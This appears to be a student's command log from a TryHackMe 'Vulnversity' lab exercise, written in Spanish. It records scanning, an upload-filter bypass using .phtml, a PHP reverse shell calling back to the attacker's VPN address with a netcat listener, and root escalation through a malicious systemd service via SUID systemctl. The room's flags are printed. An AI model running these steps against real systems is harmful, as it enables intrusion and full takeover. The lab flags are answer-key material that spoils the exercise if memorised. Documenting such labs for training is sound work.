@@ -1,0 +1,226 @@
+=========================================================
+ BITÁCORA DE COMANDOS - Sala Vulnversity (Nivel 2)
+ TP_TryHackMe - Actividad A08 - INSECUR S.A.
+ Alumna: Chiara Hernandez | Fecha: 2026-10-05
+ Máquina objetivo: 10.67.128.135
+=========================================================
+
+--- 1. Verificación de conectividad ---
+
+$ ping -c 4 10.67.128.135
+PING 10.67.128.135 (10.67.128.135) 56(84) bytes of data.
+64 bytes from 10.67.128.135: icmp_seq=1 ttl=62 time=135 ms
+64 bytes from 10.67.128.135: icmp_seq=2 ttl=62 time=134 ms
+64 bytes from 10.67.128.135: icmp_seq=3 ttl=62 time=141 ms
+64 bytes from 10.67.128.135: icmp_seq=4 ttl=62 time=137 ms
+--- 10.67.128.135 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3004ms
+rtt min/avg/max/mdev = 134.090/136.833/141.140/2.697 ms
+
+
+--- 2. Reconocimiento y escaneo (Nmap) ---
+
+$ nmap -sV 10.67.128.135 -oN bitacora/nmap_sV_vulnversity.txt
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.5
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 4
+445/tcp  open  netbios-ssn Samba smbd 4
+3128/tcp open  http-proxy  Squid http proxy 4.10
+3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+$ nmap -p- --min-rate 5000 10.67.128.135 -oN bitacora/nmap_allports_vulnversity.txt
+PORT      STATE    SERVICE
+21/tcp    open     ftp
+22/tcp    open     ssh
+139/tcp   open     netbios-ssn
+445/tcp   open     microsoft-ds
+3128/tcp  open     squid-http
+3333/tcp  open     dec-notes
+45444/tcp filtered unknown
+54920/tcp filtered unknown
+
+Conclusiones: 6 puertos abiertos, Squid 4.10 en 3128, servidor web Apache 2.4.41
+(Ubuntu) en 3333, SO probable: Linux/Ubuntu.
+
+
+--- 3. Enumeración web (Gobuster) ---
+
+# Se intentó usar la wordlist sugerida por la guía del AttackBox
+# (/usr/share/wordlists/dirbuster/directory-list-1.0.txt), no disponible en el
+# entorno local WSL/Kali. Tras instalar el paquete `wordlists` y revisar
+# `seclists`, se utilizó el equivalente funcional:
+# DirBuster-2007_directory-list-2.3-medium.txt
+
+$ gobuster dir -u http://10.67.128.135:3333 \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
+  -o bitacora/gobuster_vulnversity.txt
+
+images               (Status: 301) [Size: 322] [--> http://10.67.128.135:3333/images/]
+css                  (Status: 301) [Size: 319] [--> http://10.67.128.135:3333/css/]
+js                   (Status: 301) [Size: 318] [--> http://10.67.128.135:3333/js/]
+fonts                (Status: 301) [Size: 321] [--> http://10.67.128.135:3333/fonts/]
+internal             (Status: 301) [Size: 324] [--> http://10.67.128.135:3333/internal/]
+server-status        (Status: 403) [Size: 280]
+
+Hallazgo: /internal/ expone un formulario de carga de archivos sin autenticación.
+
+$ curl -s http://10.67.128.135:3333/internal/ -o bitacora/internal_response.html
+# Contenido relevante del form:
+# <form action="index.php" method="post" enctype="multipart/form-data">
+#   <input type="file" name="file" id="file">
+#   <input type="submit" value="Submit" name="submit">
+# </form>
+
+
+--- 4. Explotación: bypass de filtro de extensiones (Burp Suite) ---
+
+# Instalación de Burp Suite (no venía en la imagen base de WSL/Kali):
+$ sudo apt install burpsuite -y
+$ burpsuite &
+
+# Configuración de proxy del navegador: 127.0.0.1:8080
+# Nota: la VPN de TryHackMe está conectada dentro de WSL, por lo que se usó
+# un navegador corriendo también dentro de WSL (firefox-esr vía WSLg) en vez
+# del navegador nativo de Windows, que no tiene ruta a la red de la VPN.
+$ sudo apt install firefox-esr -y
+$ firefox-esr &
+
+# Prueba manual con archivos de extensión común:
+$ echo "test" > /tmp/test.txt
+$ echo "test" > /tmp/test.php
+# Resultado: .txt sube sin problema; .php responde "not allowed" (bloqueado).
+
+# Fuzzing de extensiones con Burp Intruder (ataque Sniper) sobre el campo
+# filename="test.§txt§", payloads: php, php3, php4, php5, phtml
+
+Request   Payload   Status   Length
+0         (txt)     200      774
+1         php       200      773   -> respuesta "not allowed"
+2         php3      200      774
+3         php4      200      773
+4         php5      200      774
+5         phtml     200      759   -> respuesta "success" (ÚNICA extensión aceptada)
+
+Conclusión: el servidor bloquea .php mediante blacklist, pero no contempla
+.phtml, que Apache interpreta igualmente como código PHP ejecutable.
+=> H-03: Unrestricted Upload of File with Dangerous Type (CWE-434)
+
+
+--- 5. Explotación: Reverse shell PHP ---
+
+$ ip addr show tun0 | grep inet
+    inet 192.168.147.110/18 brd 192.168.191.255 scope global tun0
+
+$ curl -o ~/php-reverse-shell.php \
+  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+$ nano ~/php-reverse-shell.php
+# Se edita la línea: $ip = '192.168.147.110';  (IP de tun0)
+# Puerto dejado en 1234.
+
+$ mv ~/php-reverse-shell.php ~/php-reverse-shell.phtml
+
+# Listener de Netcat:
+$ nc -lvnp 1234
+listening on [any] 1234 ...
+
+# Se sube php-reverse-shell.phtml desde el form de /internal/ (Intercept de
+# Burp apagado) y se ejecuta navegando a:
+# http://10.67.128.135:3333/internal/uploads/php-reverse-shell.phtml
+
+# Conexión recibida:
+connect to [192.168.147.110] from (UNKNOWN) [10.67.128.135] 51568
+Linux ip-10-67-128-135 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@ip-10-67-128-135:/$
+
+
+--- 6. Post-explotación: enumeración de usuarios y user flag ---
+
+www-data@ip-10-67-128-135:/$ cat /etc/passwd
+[...]
+bill:x:1000:1000:,,,:/home/bill:/bin/bash
+[...]
+ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
+
+www-data@ip-10-67-128-135:/$ ls -la /home/
+drwxr-xr-x  2 bill   bill   4096 Jul 31  2019 bill
+drwxr-xr-x  4 ubuntu ubuntu 4096 Jun 12  2025 ubuntu
+
+=> Usuario que administra el webserver: bill
+
+www-data@ip-10-67-128-135:/$ ls -la /home/bill/
+-rw-r--r-- 1 bill bill   33 Jul 31  2019 user.txt   <-- permisos 644, legible por cualquiera
+
+www-data@ip-10-67-128-135:/$ cat /home/bill/user.txt
+8bd7992fbe8a6ad22a63361004cfcedb
+
+$ echo -n "8bd7992fbe8a6ad22a63361004cfcedb" | sha256sum
+d324bd433001e5bdfe39e04d794539c15b51982a5bf6fc78efea46369b7bf956  -
+
+
+--- 7. Post-explotación: escalada de privilegios (SUID en systemctl) ---
+
+www-data@ip-10-67-128-135:/$ find / -perm -4000 -type f 2>/dev/null > /tmp/suid_files.txt
+www-data@ip-10-67-128-135:/$ cat /tmp/suid_files.txt
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/mount
+/bin/umount
+/bin/systemctl          <-- NO estándar, fuera de lugar
+/bin/fusermount
+[... binarios de /snap/ equivalentes ...]
+/sbin/mount.cifs
+
+=> Binario que sobresale: /bin/systemctl (SUID indebido)
+
+# Explotación vía systemd service malicioso:
+www-data@ip-10-67-128-135:/$ TF=$(mktemp).service
+www-data@ip-10-67-128-135:/$ echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
+
+www-data@ip-10-67-128-135:/$ systemctl link $TF
+Created symlink /etc/systemd/system/tmp.vsbwvpw93i.service -> /tmp/tmp.vsbwvpw93i.service.
+
+www-data@ip-10-67-128-135:/$ systemctl enable --now $TF
+Created symlink /etc/systemd/system/multi-user.target.wants/tmp.vsbwvpw93i.service -> /tmp/tmp.vsbwvpw93i.service.
+
+www-data@ip-10-67-128-135:/$ /bin/bash -p
+bash-5.0# whoami
+root
+
+bash-5.0# cat /root/root.txt
+a58ff8579f0a9270368d33a9966c7fd5
+
+$ echo -n "a58ff8579f0a9270368d33a9966c7fd5" | sha256sum
+cfbc740435ad60030304080e35131ffcaf8ac5f71b65e002f5b546aa3cda7ce8  -
+
+=> H-04: Execution with Unnecessary Privileges (CWE-250) - SUID indebido en
+   /bin/systemctl, escalada de www-data a root sin credenciales.
+
+
+=========================================================
+ FIN DE LA SESIÓN - Vulnversity completada (user + root)
+=========================================================
